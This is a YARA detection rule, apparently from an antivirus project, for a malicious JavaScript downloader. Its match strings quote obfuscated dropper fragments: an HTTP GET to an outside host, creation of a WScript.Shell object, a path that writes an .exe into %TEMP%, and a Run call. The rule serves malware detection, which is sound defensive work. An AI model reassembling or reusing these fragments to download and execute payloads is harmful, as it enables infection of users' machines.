rule sig_20160401_23f8ab9b1b84063eceea29cc2deb541e {
  meta:
    description = "datamaliciousorder - file 20160401_23f8ab9b1b84063eceea29cc2deb541e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4daf950df9ba03a8d685828696c85a5fb5895a1451e7e57aace9d12d879a66a8"

  strings:
    $s1  = "DqGr[ZdzOxu](\"G\" + \"ET\", \"http://hotlinehomeappliances.com/l3ospa\", false);" fullword ascii
    $s2  = "var MonEj = function BwhZs() {return WScript[HmxKm](\"WScript\"+\".Shell\");}(), JtaZf = 11;" fullword ascii
    $s3  = "function SbXy(FyjTyd, WirNd){SboXbm = SboXbm * 1; return FyjTyd - WirNd;};" fullword ascii
    $s4  = "if (DqGr[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function KxmHff(){return RgwTwb + \"\";};" fullword ascii
    $s6  = "function XkqNe() {return MonEj[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"vMD3CFtIqXmjNC.ex\" + \"e\";};" fullword ascii
    $s7  = "function ZjAdl() {return ((XrTg == true) && (XrTg == WaQt)) ? 1 : SboXbm;};" fullword ascii
    $s8  = "function QdzJlv(WnuHff) {var LeOx = (1, 2, 3, 4, 5, WnuHff); return LeOx;};" fullword ascii
    $s9  = "var WaQt = false;" fullword ascii
    $s10 = "function BnvCv()" fullword ascii
    $s11 = "var OeAgj = new this[\"Date\"]();" fullword ascii
    $s12 = "}while (CfBdb);" fullword ascii
    $s13 = "function RrpNh(){return HmxKm;};" fullword ascii
    $s14 = "var XrTg = false;" fullword ascii
    $s15 = "WaQt = true; " fullword ascii
    $s16 = "function HhfUbn(KxHr){MonEj[\"R\"+\"un\"](KxHr, SboXbm, SboXbm);};" fullword ascii
    $s17 = "function VqeCjm(){return 23;};" fullword ascii
    $s18 = "var IsXt = false;" fullword ascii
    $s19 = "return SbXy(KweZwn, KyShq);" fullword ascii
    $s20 = "XrTg = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}